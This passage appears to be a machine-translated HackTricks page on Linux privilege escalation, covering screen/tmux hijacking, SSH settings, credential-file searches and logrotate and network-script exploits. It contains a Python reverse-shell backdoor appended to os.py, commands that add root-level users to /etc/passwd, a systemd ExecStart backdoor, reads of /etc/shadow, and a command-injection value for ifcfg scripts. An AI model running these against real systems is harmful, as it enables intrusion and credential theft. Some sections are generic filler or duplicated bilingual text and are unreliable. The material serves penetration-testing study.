#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取**系统中具有特定ACL的文件：

```bash
getfacl -R /path/to/directory | grep "user:username:.*r"
```

This command will recursively search for files in the specified directory and its subdirectories, and retrieve the ACLs using the `getfacl` command. The output will then be filtered using `grep` to only display the files that have the specified ACL for a specific user (`username`) with read (`r`) permission.
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 打开shell会话

在**旧版本**中，您可以**劫持**不同用户（**root**）的某个**shell**会话。\
在**最新版本**中，您只能**连接到自己的用户**的屏幕会话。但是，您可能会在会话中找到**有趣的信息**。

### 屏幕会话劫持

**列出屏幕会话**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**附加到会话**

To escalate privileges on a Linux system, it is often necessary to attach to an existing session. This allows the hacker to gain control over the session and execute commands with elevated privileges.

There are several methods to attach to a session, depending on the circumstances and the tools available. Here are some common techniques:

1. **Screen**: The `screen` command allows you to attach to a detached session or create a new session. To attach to an existing session, use the command `screen -r <session_name>`. This will give you access to the session and its privileges.

2. **tmux**: Similar to `screen`, `tmux` is another terminal multiplexer that allows you to attach to existing sessions. To attach to a session, use the command `tmux attach-session -t <session_name>`.

3. **SSH**: If you have SSH access to a remote system, you can use the `ssh` command to attach to a session. Use the command `ssh user@host -t "command"` to execute a command within the session.

4. **Debuggers**: Debuggers like `gdb` or `lldb` can also be used to attach to a running process and gain control over its execution. This technique is often used for privilege escalation in binary exploitation scenarios.

5. **Job control**: If you have access to a shell session, you can use job control to attach to a suspended process. Use the command `fg` to bring the process to the foreground and gain control over it.

Remember, attaching to a session requires some level of access to the system. It is important to use these techniques responsibly and only on systems that you have permission to access.
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux会话劫持

这是一个**旧版tmux的问题**。我无法劫持由root创建的tmux（v2.1）会话，作为非特权用户。

**列出tmux会话**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**连接到会话**

To escalate privileges on a Linux system, it is often necessary to attach to an existing session. This allows the hacker to gain control over the session and execute commands with higher privileges. There are several methods to achieve this, depending on the specific circumstances.

One common method is to exploit vulnerabilities in the session management system. This can be done by finding and exploiting bugs in the software that handles session creation and management. By exploiting these vulnerabilities, the hacker can gain unauthorized access to a session and escalate their privileges.

Another method is to hijack an existing session. This can be done by stealing the session token or session ID of a legitimate user. Once the hacker has obtained this information, they can use it to authenticate themselves as the legitimate user and gain control over their session.

In some cases, it may be possible to attach to a session by brute-forcing the session ID. This involves trying different session IDs until a valid one is found. This method can be time-consuming and may not always be successful, but it can be effective in certain situations.

It is important to note that attaching to a session without proper authorization is illegal and unethical. This information is provided for educational purposes only and should not be used for any malicious activities.
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
请查看**HTB的Valentine box**作为示例。

## SSH

### Debian OpenSSL可预测PRNG - CVE-2008-0166

在2006年9月至2008年5月13日之间，在基于Debian的系统（如Ubuntu，Kubuntu等）上生成的所有SSL和SSH密钥可能受到此漏洞的影响。\
此漏洞是在这些操作系统中创建新的ssh密钥时引起的，因为**只有32768种可能性**。这意味着所有可能性都可以计算出来，**通过拥有ssh公钥，您可以搜索相应的私钥**。您可以在此处找到计算出的可能性：[https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH有趣的配置值

* **PasswordAuthentication：**指定是否允许密码身份验证。默认值为`no`。
* **PubkeyAuthentication：**指定是否允许公钥身份验证。默认值为`yes`。
* **PermitEmptyPasswords：**当允许密码身份验证时，指定服务器是否允许登录到空密码字符串的帐户。默认值为`no`。

### PermitRootLogin

指定root是否可以使用ssh登录，默认值为`no`。可能的值：

* `yes`：root可以使用密码和私钥登录
* `without-password`或`prohibit-password`：root只能使用私钥登录
* `forced-commands-only`：root只能使用私钥登录，并且如果指定了命令选项
* `no`：不允许

### AuthorizedKeysFile

指定包含可用于用户身份验证的公钥的文件。它可以包含像`%h`这样的标记，它将被主目录替换。**您可以指示绝对路径**（以`/`开头）或**相对于用户主目录的相对路径**。例如：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置将指示，如果您尝试使用用户“testusername”的**私钥**进行登录，ssh将会将您的密钥的公钥与位于`/home/testusername/.ssh/authorized_keys`和`/home/testusername/access`中的公钥进行比较。

### ForwardAgent/AllowAgentForwarding

SSH代理转发允许您使用本地SSH密钥，而不是将（没有密码短语！）的密钥留在服务器上。因此，您将能够通过ssh**跳转**到一个主机，然后从那里使用**初始主机**中的密钥**跳转到另一个**主机。

您需要在`$HOME/.ssh.config`中设置此选项，如下所示：
```
Host example.com
ForwardAgent yes
```
请注意，如果`Host`是`*`，每次用户跳转到不同的机器时，该主机将能够访问密钥（这是一个安全问题）。

文件`/etc/ssh_config`可以**覆盖**这个**选项**，允许或拒绝这个配置。\
文件`/etc/sshd_config`可以使用关键字`AllowAgentForwarding`（默认为允许）来**允许**或**拒绝**ssh-agent转发。

如果您发现在某个环境中配置了Forward Agent，请阅读以下页面，因为**您可能能够利用它来提升权限**：

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## 有趣的文件

### 配置文件

文件`/etc/profile`和`/etc/profile.d/`目录下的文件是**当用户运行新的shell时执行的脚本**。因此，如果您可以**编写或修改其中任何一个文件，您就可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何奇怪的配置文件，应该检查其中是否包含**敏感信息**。

### Passwd/Shadow 文件

根据操作系统的不同，`/etc/passwd` 和 `/etc/shadow` 文件的名称可能不同，或者可能有备份文件。因此，建议**找到所有这些文件**并**检查是否可以读取**它们，以查看文件中是否包含**哈希值**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可以在`/etc/passwd`（或等效）文件中找到**密码哈希值**。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用以下命令之一生成一个密码。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
然后添加用户`hacker`并添加生成的密码。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如：`hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

您现在可以使用`su`命令和`hacker:hacker`登录。

或者，您可以使用以下行添加一个没有密码的虚拟用户。\
警告：这可能会降低机器的当前安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在BSD平台上，`/etc/passwd`位于`/etc/pwd.db`和`/etc/master.passwd`，而`/etc/shadow`被重命名为`/etc/spwd.db`。

您应该检查是否可以**写入某些敏感文件**。例如，您能否写入某些**服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行一个 **tomcat** 服务器，并且你可以 **修改位于 /etc/systemd/ 目录下的 Tomcat 服务配置文件**，那么你可以修改以下行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
你的后门将在下次启动tomcat时执行。

### 检查文件夹

以下文件夹可能包含备份或有趣的信息：**/tmp**，**/var/tmp**，**/var/backups**，**/var/mail**，**/var/spool/mail**，**/etc/exports**，**/root**（最后一个可能无法读取，但请尝试）。
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 异常位置/被占有的文件

When performing privilege escalation on a Linux system, it is important to look for files that are located in unusual or unexpected locations, as well as files that are owned by privileged users. These files can potentially be leveraged to gain higher levels of access.

Here are some common locations and files to check:

#### /tmp Directory

The `/tmp` directory is a common location for temporary files. Attackers may place malicious scripts or binaries in this directory to escalate privileges. Look for files with unusual names or file extensions, as well as files owned by privileged users.

#### /var/tmp Directory

Similar to the `/tmp` directory, the `/var/tmp` directory is another location where temporary files are stored. Check for suspicious files or files owned by privileged users.

#### World-Writable Directories

Directories that have the write permission for all users (`777` permission) can be potential targets for privilege escalation. Attackers can place malicious files in these directories and execute them to gain elevated privileges. Look for directories with the `777` permission and investigate the files within them.

#### SUID/SGID Files

SUID (Set User ID) and SGID (Set Group ID) are special permissions that can be assigned to executable files. When a user executes an SUID/SGID file, the process runs with the privileges of the file owner or group owner, respectively. Check for files with these permissions, as they can be used to escalate privileges.

#### Configuration Files

Configuration files, such as those found in the `/etc` directory, may contain sensitive information or be misconfigured, allowing privilege escalation. Look for files with weak permissions or files that are owned by privileged users.

#### Custom Scripts and Binaries

Check for any custom scripts or binaries that are not part of the standard Linux distribution. Attackers may place malicious files in these locations to escalate privileges. Look for files with unusual names or files owned by privileged users.

By examining these locations and files, you can identify potential vulnerabilities that can be exploited for privilege escalation on a Linux system.
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟内修改的文件

To identify the files that have been modified in the last few minutes, you can use the following command:

要识别最近几分钟内被修改的文件，您可以使用以下命令：

```bash
find / -type f -mmin -5
```

This command will search for all files (`-type f`) in the entire file system (`/`) that have been modified within the last 5 minutes (`-mmin -5`).

该命令将在整个文件系统 (`/`) 中搜索所有在最近 5 分钟内被修改的文件 (`-type f -mmin -5`)。
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite数据库文件

Sqlite是一种轻量级的嵌入式数据库引擎，常用于移动应用和小型项目中。它的数据库文件通常具有`.db`或`.sqlite`的扩展名。这些文件包含了应用程序的数据，包括用户信息、配置设置和其他重要数据。

在特定的情况下，访问和分析Sqlite数据库文件可能会成为特权升级的一种方法。这是因为某些应用程序可能会在数据库文件中存储敏感信息，如密码、密钥或其他凭据。通过获取对这些文件的访问权限，黑客可以进一步探索系统并获取更高的权限。

在进行Sqlite数据库文件的特权升级时，黑客可以使用各种技术和工具。这些包括查找可写的目录、利用应用程序漏洞、使用特权升级脚本等。黑客还可以使用Sqlite数据库文件的特殊功能和语法来执行恶意操作，如注入恶意代码或执行未授权的查询。

为了保护系统免受Sqlite数据库文件的特权升级攻击，建议采取以下措施：

- 限制对数据库文件的访问权限，确保只有授权用户可以读取和写入这些文件。
- 定期更新和修补应用程序，以防止已知的漏洞被利用。
- 使用强密码和加密算法来保护数据库文件中的敏感信息。
- 监控系统日志，及时发现和响应任何异常活动。

通过采取这些措施，可以增强系统对Sqlite数据库文件特权升级攻击的防御能力，并保护用户的数据安全。
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件

这些文件包括 \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml。
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件

Hidden files are files that are not visible by default in a file manager or command line interface. These files are often used to store sensitive information or configuration settings. In Linux, hidden files are denoted by a dot (.) at the beginning of the file name.

隐藏文件是在文件管理器或命令行界面中默认情况下不可见的文件。这些文件通常用于存储敏感信息或配置设置。在Linux中，隐藏文件的文件名前面有一个点（.）。

To view hidden files in a file manager, you can usually enable an option to show hidden files. In the command line interface, you can use the `ls -a` command to display all files, including hidden ones.

要在文件管理器中查看隐藏文件，通常可以启用一个选项来显示隐藏文件。在命令行界面中，可以使用`ls -a`命令显示所有文件，包括隐藏文件。

Hidden files can be used by attackers to hide malicious scripts or backdoors on a compromised system. Therefore, it is important to regularly check for and remove any suspicious hidden files.

攻击者可以利用隐藏文件在受攻击的系统上隐藏恶意脚本或后门。因此，定期检查并删除任何可疑的隐藏文件非常重要。
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **路径中的脚本/可执行文件**

One common privilege escalation technique is to exploit the presence of scripts or binaries in the system's PATH. The PATH is an environment variable that contains a list of directories where the operating system looks for executable files.

By placing a malicious script or binary with the same name as a commonly used command in one of the directories listed in the PATH, an attacker can trick the system into executing the malicious code instead of the legitimate command.

To identify potential vulnerabilities related to scripts or binaries in the PATH, follow these steps:

1. List the directories in the PATH by running the command:

   ```bash
   echo $PATH
   ```

2. For each directory listed, check if there are any scripts or binaries with names similar to commonly used commands. For example, look for files named `sudo`, `su`, `ssh`, etc.

3. Verify the permissions of these files. If they are writable by the current user or have elevated permissions, it may indicate a potential vulnerability.

4. Inspect the contents of these files to determine if they contain malicious code. Look for any suspicious or unexpected commands or functions.

If you find any suspicious files, it is recommended to remove or rename them to prevent potential privilege escalation attacks. Additionally, ensure that the directories in the PATH have proper permissions and only contain trusted scripts or binaries.
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **网页文件**

Web files are files that are used by web applications to display content on the internet. These files can include HTML, CSS, JavaScript, images, and other media files. Web files are typically stored on a web server and accessed by users through a web browser.

Web文件是由Web应用程序用于在互联网上显示内容的文件。这些文件可以包括HTML、CSS、JavaScript、图像和其他媒体文件。Web文件通常存储在Web服务器上，并通过Web浏览器由用户访问。

Web files can be vulnerable to attacks if they are not properly secured. Attackers can exploit vulnerabilities in web files to gain unauthorized access to a web server or to execute malicious code on the server. Therefore, it is important to implement proper security measures to protect web files from unauthorized access and exploitation.

如果Web文件没有得到适当的安全保护，它们可能会受到攻击。攻击者可以利用Web文件中的漏洞来未经授权地访问Web服务器或在服务器上执行恶意代码。因此，实施适当的安全措施以保护Web文件免受未经授权的访问和利用是非常重要的。

Some common security measures for web files include:

一些常见的Web文件安全措施包括：

- **File permissions**: Set appropriate file permissions to restrict access to web files. Only allow the necessary permissions for the web server to read and execute the files.

- **文件权限**：设置适当的文件权限以限制对Web文件的访问。只允许Web服务器读取和执行文件所需的权限。

- **Input validation**: Validate user input to prevent malicious code injection attacks such as SQL injection or cross-site scripting (XSS).

- **输入验证**：验证用户输入，以防止恶意代码注入攻击，如SQL注入或跨站脚本（XSS）。

- **Secure coding practices**: Follow secure coding practices to minimize the risk of vulnerabilities in web files. This includes using secure coding frameworks, libraries, and avoiding common coding mistakes.

- **安全编码实践**：遵循安全编码实践，以最小化Web文件中的漏洞风险。这包括使用安全编码框架、库，并避免常见的编码错误。

- **Regular updates**: Keep web files up to date by applying security patches and updates provided by the software vendors. This helps to address any known vulnerabilities and protect against potential attacks.

- **定期更新**：通过应用软件供应商提供的安全补丁和更新，使Web文件保持最新状态。这有助于解决任何已知的漏洞，并保护免受潜在攻击。

By implementing these security measures, you can significantly reduce the risk of unauthorized access and exploitation of web files. It is important to regularly review and update these security measures to stay ahead of emerging threats and vulnerabilities.
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**

Backups are an essential part of any system's security strategy. They help protect against data loss and can be a lifesaver in the event of a system compromise or hardware failure. It is important to have a robust backup system in place to ensure that critical data can be restored quickly and efficiently.

备份是任何系统安全策略的重要组成部分。它们有助于防止数据丢失，并在系统受到威胁或硬件故障时起到救命稻草的作用。建立一个强大的备份系统非常重要，以确保关键数据可以快速高效地恢复。

#### **Backup Best Practices**

#### **备份最佳实践**

- **Regular backups**: Perform regular backups of all critical data. This ensures that the most up-to-date version of the data is available for restoration.

- **定期备份**：定期备份所有关键数据。这样可以确保最新版本的数据可用于恢复。

- **Offsite backups**: Store backups in an offsite location to protect against physical damage or theft. This can be done by using cloud storage or by physically storing backups in a different location.

- **离线备份**：将备份存储在离线位置，以防止物理损坏或盗窃。可以通过使用云存储或在不同位置物理存储备份来实现。

- **Encryption**: Encrypt backups to protect sensitive data from unauthorized access. This ensures that even if the backups are compromised, the data remains secure.

- **加密**：对备份进行加密，以保护敏感数据免受未经授权的访问。这样即使备份被攻击，数据也能保持安全。

- **Testing backups**: Regularly test backups to ensure that they can be successfully restored. This helps identify any issues or errors in the backup process before they are needed.

- **测试备份**：定期测试备份，以确保可以成功恢复。这有助于在需要之前发现备份过程中的任何问题或错误。

- **Backup rotation**: Implement a backup rotation strategy to ensure that multiple copies of backups are available. This helps protect against data corruption or accidental deletion.

- **备份轮换**：实施备份轮换策略，以确保有多个备份副本可用。这有助于防止数据损坏或意外删除。

- **Monitoring**: Monitor backup processes to ensure that they are running successfully and that backups are being created as expected.

- **监控**：监控备份过程，确保它们成功运行，并按预期创建备份。

By following these backup best practices, you can ensure that your critical data is protected and can be easily restored in the event of a system compromise or data loss.

通过遵循这些备份最佳实践，您可以确保关键数据在系统受到威胁或数据丢失时得到保护，并可以轻松恢复。
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 已知包含密码的文件

阅读 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索**可能包含密码的多个文件**。\
另一个有趣的工具是 [**LaZagne**](https://github.com/AlessandroZ/LaZagne)，它是一个开源应用程序，用于检索存储在Windows、Linux和Mac本地计算机上的许多密码。

### 日志

如果你能读取日志，可能会在其中找到**有趣/机密的信息**。日志越奇怪，可能越有趣。\
此外，一些“**不好的**”配置（后门？）的**审计日志**可能允许你在审计日志中**记录密码**，如此文章所述：[https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了**读取日志，adm组**（有趣的Linux特权升级/#adm组）将非常有帮助。

### Shell文件
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 通用凭证搜索/正则表达式

你还应该检查文件名或内容中包含单词“**password**”的文件，还应该检查日志中的IP和电子邮件，或者哈希正则表达式。\
我不会在这里列出如何执行所有这些操作，但如果你感兴趣，可以查看[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)执行的最后一些检查。

## 可写文件

### Python库劫持

如果你知道一个Python脚本将在哪里执行，并且你可以在该文件夹中**写入**或者你可以**修改Python库**，你可以修改操作系统库并植入后门（如果你可以在Python脚本将要执行的地方写入，请复制并粘贴os.py库）。

要**植入后门**，只需在os.py库的末尾添加以下行（更改IP和端口）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate漏洞利用

`logrotate`存在一个漏洞，允许具有**对日志文件或其任何父目录的写权限**的用户在**任何位置**上写入文件。如果**root**执行了**logrotate**，那么用户将能够在任何用户登录时执行的_**/etc/bash\_completion.d/**_中写入任何文件。

因此，如果您对**日志文件**或其**父文件夹**具有**写权限**，则可以进行**特权升级**（在大多数Linux发行版上，logrotate每天自动以**root用户**身份执行）。此外，请检查是否除了_/var/log_之外还有其他文件被**轮换**。

{% hint style="info" %}
此漏洞影响`logrotate`版本`3.18.0`及更早版本
{% endhint %}

有关漏洞的更详细信息，请参阅此页面：[https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

您可以使用[**logrotten**](https://github.com/whotwagner/logrotten)利用此漏洞。

此漏洞与[**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **（nginx日志）**非常相似，因此每当您发现可以更改日志时，请检查谁在管理这些日志，并检查是否可以通过符号链接升级权限。

### /etc/sysconfig/network-scripts/（Centos/Redhat）

如果由于某种原因，用户能够将`ifcf-<whatever>`脚本写入_/etc/sysconfig/network-scripts_，**或者**可以**调整**现有脚本，则您的**系统已被入侵**。

网络脚本（例如ifcg-eth0）用于网络连接。它们看起来与.INI文件完全相同。但是，在Linux上，它们是由Network Manager（dispatcher.d）\~源代码\~。

在我的情况下，这些网络脚本中的`NAME=`属性没有正确处理。如果名称中有**空格**，系统将尝试执行空格后的部分。这意味着**第一个空格后的所有内容都将以root身份执行**。

例如：_/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
**漏洞参考：** [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

### **init、init.d、systemd和rc.d**

`/etc/init.d` 包含了 System V init 工具（SysVinit）使用的 **脚本**。这是 Linux 的传统服务管理包，包含了 `init` 程序（在内核完成初始化后运行的第一个进程¹）以及一些用于启动、停止服务和配置服务的基础设施。具体来说，`/etc/init.d` 中的文件是 shell 脚本，用于响应 `start`、`stop`、`restart` 和（如果支持）`reload` 命令来管理特定的服务。这些脚本可以直接调用，也可以通过其他触发器（通常是在 `/etc/rc?.d/` 中存在符号链接）来调用（来自[这里](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)）。在 Redhat 中，这个文件夹的另一个替代位置是 `/etc/rc.d/init.d`。

`/etc/init` 包含了 **Upstart** 使用的 **配置文件**。Upstart 是由 Ubuntu 支持的一种年轻的服务管理包。`/etc/init` 中的文件是配置文件，告诉 Upstart 如何以及何时 `start`、`stop`、`reload` 配置，或查询服务的 `status`。从 lucid 开始，Ubuntu 正在从 SysVinit 迁移到 Upstart，这就解释了为什么许多服务都带有 SysVinit 脚本，尽管 Upstart 配置文件更受欢迎。SysVinit 脚本由 Upstart 中的兼容性层处理（来自[这里](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)）。

**systemd** 是一个 **Linux 初始化系统和服务管理器**，包括按需启动守护进程、挂载和自动挂载点维护、快照支持以及使用 Linux 控制组跟踪进程。systemd 提供了一个日志守护进程和其他工具和实用程序，以帮助完成常见的系统管理任务（来自[这里](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/)）。

从发行版仓库下载的软件包中的文件放在 `/usr/lib/systemd/` 中。系统管理员（用户）进行的修改放在 `/etc/systemd/system/` 中。

## 其他技巧

### NFS 权限提升

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### 逃离受限 Shell

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## 内核安全保护

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 更多帮助

[Static impacket binaries](https://github.com/ropnop/impacket\_static\_binaries)

## Linux/Unix 提权工具

### 寻找 Linux 本地权限提升向量的最佳工具：[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** 枚举 Linux 和 MAC 中的内核漏洞 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (物理访问):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**更多脚本的汇编**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## 参考资料

[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\
[https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\
[https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\
[http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\
[https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\
[https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\
[https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\
[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
[https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者想要获取**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)。
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)。
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**Telegram群组**](https://t.me/peass)，或者**关注**我的**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
